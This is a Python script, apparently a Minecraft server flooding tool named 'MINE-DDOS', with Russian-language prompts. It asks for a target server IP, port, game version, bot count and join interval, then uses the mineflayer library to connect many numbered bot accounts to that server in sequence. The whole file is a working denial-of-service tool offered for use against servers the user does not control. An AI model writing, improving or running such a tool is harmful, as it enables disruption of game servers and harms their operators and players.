#3д тексты
border = """
███╗░░░███╗██╗███╗░░██╗███████╗░░░░░░██████╗░██████╗░░█████╗░░██████╗
████╗░████║██║████╗░██║██╔════╝░░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝
██╔████╔██║██║██╔██╗██║█████╗░░█████╗██║░░██║██║░░██║██║░░██║╚█████╗░
██║╚██╔╝██║██║██║╚████║██╔══╝░░╚════╝██║░░██║██║░░██║██║░░██║░╚═══██╗
██║░╚═╝░██║██║██║░╚███║███████╗░░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝░░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░"""

loading1 = """
██╗░░░░░░█████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░░░░
██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░░░░
██║░░░░░██║░░██║███████║██║░░██║██║██╔██╗██║██║░░██╗░░░░
██║░░░░░██║░░██║██╔══██║██║░░██║██║██║╚████║██║░░╚██╗░░░
███████╗╚█████╔╝██║░░██║██████╔╝██║██║░╚███║╚██████╔╝██╗
╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝"""

loading2 = """
██╗░░░░░░█████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░░░░░░░
██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░░░░░░░
██║░░░░░██║░░██║███████║██║░░██║██║██╔██╗██║██║░░██╗░░░░░░░
██║░░░░░██║░░██║██╔══██║██║░░██║██║██║╚████║██║░░╚██╗░░░░░░
███████╗╚█████╔╝██║░░██║██████╔╝██║██║░╚███║╚██████╔╝██╗██╗
╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝╚═╝"""

loading3 = """
██╗░░░░░░█████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░░░░░░░░░░
██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░░░░░░░░░░
██║░░░░░██║░░██║███████║██║░░██║██║██╔██╗██║██║░░██╗░░░░░░░░░░
██║░░░░░██║░░██║██╔══██║██║░░██║██║██║╚████║██║░░╚██╗░░░░░░░░░
███████╗╚█████╔╝██║░░██║██████╔╝██║██║░╚███║╚██████╔╝██╗██╗██╗
╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝╚═╝╚═╝"""

loading_success = """
░██████╗██╗░░░██╗░█████╗░░█████╗░███████╗░██████╗░██████╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
╚█████╗░██║░░░██║██║░░╚═╝██║░░╚═╝█████╗░░╚█████╗░╚█████╗░
░╚═══██╗██║░░░██║██║░░██╗██║░░██╗██╔══╝░░░╚═══██╗░╚═══██╗
██████╔╝╚██████╔╝╚█████╔╝╚█████╔╝███████╗██████╔╝██████╔╝
╚═════╝░░╚═════╝░░╚════╝░░╚════╝░╚══════╝╚═════╝░╚═════╝░"""

error = """
███████╗██████╗░██████╗░░█████╗░██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝
██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗
███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝"""

#импорты модулей
import os
try:
    from javascript import require, On
except:
    os.system('pip install javascript')
import random
import time
try:
    from platform import platform
except:
    os.system("pip install platform")
    from platform import platform
puk = platform()[0], platform()[1], platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'

#функции
count = 0
def loading():
    global count
    count += 1
    if count <= 10:
        os.system(delet)
        print(loading1)
        time.sleep(0.3)
        os.system(delet)
        print(loading2)
        time.sleep(0.3)
        os.system(delet)
        print(loading3)
        time.sleep(0.3)
        loading()
    else:
        count = 0

def title():
    os.system(delet)
    print(border)

#код
loading()

#подключение
mineflayer = require('mineflayer')
pathfinder = require('mineflayer-pathfinder')
GoalFollow = pathfinder.goals.GoalFollow

#загрузка
os.system(delet)
print(loading_success)
time.sleep(3)

#функция старта
def start():
    #title
    title()

    #настройка
    title()

    print('1: Айпи с портом\n2: Айпи без порта')
    try:
        method = int(input('Выберите вариант: '))
    except:
        error2('Вариант должен быть числом!')
    if method == 1:
        pass
    else:
        if method == 2:
            pass
        else:
            error2('Вы должны были выбрать вариант!')
    title()
    print('Вы должны выбрать никнэйм! Как это работает?\nВнимание:\n(никнэйм)1 присоединился к игре!\n(никнэйм)2 присоединился к игре!\n')
    name = input('Никнэйм: ')
    if name == '':
        error2('Ваш никнэйм не должен быть пустым!')
    else:
        title()
        try:
            print('Вы должны выбрать кол-во ботов которые зайдут на сервер!\n')
            count = int(input('Кол-во ботов: '))
        except:
            error2('Кол-во должно быть числом!')
        if count <= 0:
            error2('Кол-во не должно быть меньше 1!')
        else:
            title()
            print('Вы должны выбрать интервал! Как это работает?\nВнимание:\nБот присоединился к игре!\n*Прошло (интервал) секунд\nБот присоединился к игре!\n')
            try:
                timer = int(input('Интервал между заходами ботов в секундах: '))
            except:
                error2('Интервал должен быть числом!')
            title()
            ver = input('Версия: ')
            title()
            ip = input('Айпи: ')
            title()
            rand = 0

            if method == 1:
                title()
                print('Вы должны выбрать порт, что это?\nПример:\ntest.aternos.me:(порт)\n')
                try:
                    port = int(input('Введите порт: '))
                except:
                    error2('Порт должен быть числом!')
                title()
                for i in range(count):
                    time.sleep(timer)
                    rand += 1
                    bot = mineflayer.createBot({
                        'host':ip,
                        'port':port,
                        'username':f'{name}{rand}',
                        'version':ver})
            else:
                if method == 2:
                    for i in range(count):
                        time.sleep(timer)
                        rand += 1
                        bot = mineflayer.createBot({
                            'host':ip,
                            'username':f'{name}{rand}',
                            'version':ver})

    os.system(delet)
    print(border)
    print('Бот(ы) запущен(ы)!')
    print('При ошибке уведомлять команду: HackerRullerTools!')

    while True:
        pass

#Создание функции
def error2(text):
    os.system(delet)
    print(error)
    print(text)
    time.sleep(3)
    start()

#запуск
start()